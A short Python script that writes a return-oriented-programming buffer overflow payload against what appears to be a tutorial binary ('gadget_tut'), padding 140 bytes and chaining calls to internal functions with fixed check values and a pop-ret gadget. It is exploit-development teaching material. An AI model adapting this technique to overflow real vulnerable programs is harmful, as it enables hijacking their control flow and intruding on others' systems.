#!/usr/bin/env python
import sys
import struct

payload = "A" * 140
# nm ./gadget_tut |  grep call_1
call1 = 0x08048480
# Used to pass the check in call_1
param_call1 =0xdeadc0de
# 0x08048319 : pop ebx ; ret ; to clean the previous param from stack
pop_ret =  0x08048319
# nm ./gadget_tut |  grep call_2
call2 =  0x080484cd
# Params used to pass the checks in call_2
p1_call2 =  0xbeefc475
p2_call2 =  0x10101010
# nm ./gadget_tut |  grep print_the_string
show =  0x0804846c

payload += struct.pack("<III", call1, pop_ret, param_call1)
payload += struct.pack("<IIII", call2, show, p1_call2, p2_call2)

sys.stdout.write(payload)
